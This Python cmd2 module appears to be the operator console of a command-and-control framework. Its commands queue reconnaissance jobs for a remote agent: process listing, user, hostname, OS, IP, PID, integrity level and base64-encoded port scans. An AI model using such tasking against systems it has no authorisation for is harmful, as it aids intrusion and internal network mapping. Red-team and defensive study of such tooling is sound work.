from connect.convert import string_to_base64

from cmd2 import CommandSet, Statement, with_default_category, Cmd2ArgumentParser, with_argparser, argparse

@with_default_category('System')
class SystemCommands(CommandSet):
    """
    The system command set.
    """

    def __init__(self, post_job):
        super().__init__()
        self.post_job = post_job

    """ 
    PS Command 
    """

    def do_ps(self, _: Statement):
        """ Retrieves current running processes. """
        self.post_job(f'"name":"ps","description":"retrieve current running processes","arguments":"","type":1')

    """ 
    TMP Command 
    """

    def do_tmp(self, _: Statement):
        """ Retrieves current value of %TEMP% """
        self.post_job(f'"name":"tmp","description":"retrieve the value of %TEMP%","arguments":"","type":1')

    """
    Whoami Command
    """

    def do_whoami(self, _: Statement):
        """ Retrieve the username of the user. """
        self.post_job('"name":"whoami","description":"retrieve the current user","arguments":"","type":1')

    """ 
    Hostname Command 
    """

    def do_hostname(self, _: Statement):
        """ Retrieve the hostname of the machine. """
        self.post_job('"name":"hostname","description":"retrieve the hostname","arguments":"","type":1')

    """
    OS Command
    """

    def do_os(self, _: Statement):
        """ Retrieve the operating system's product and build information. """
        self.post_job(f'"name":"os","description":"retrieve the current operating system version","arguments":"","type":1')

    """
    IP Command
    """

    def do_ip(self, _: Statement):
        """ Retrieve the internet protocol address. """
        self.post_job(f'"name":"ip","description":"retrieve the the internet protocol address","arguments":"","type":1')

    """
    PID Command
    """

    def do_pid(self, _: Statement):
        """ Retrieve the current process ID. """
        self.post_job(f'"name":"pid","description":"retrieve the current process identifier","arguments":"","type":1')

    """
    Integrity Command
    """

    def do_integrity(self, _: Statement):
        """ Retrieve the current process integrity. """
        self.post_job(f'"name":"integrity","description":"retrieve the current process integrity","arguments":"","type":1')

    """
    Portscan Command
    """

    portscan_parser = Cmd2ArgumentParser()
    portscan_parser.add_argument('ips', help='The ip(s) to scan. Supported input: 0.0.0.1 | 0.0.0.0/24 | 0.0.0.1-0.0.0.255')
    portscan_parser.add_argument('ports', help='The port(s) to scan. Supported input: 445 | 443-445 | 80,443,445')

    @with_argparser(portscan_parser)
    def do_portscan(self, args: argparse.Namespace):
        """ Scan for open ports. """
        ips_b64 = string_to_base64(args.ips)
        ports_b64 = string_to_base64(args.ports)
        self.post_job(f'"name":"portscan","description":"scan for open ports","arguments":"{ips_b64},{ports_b64}","type":1')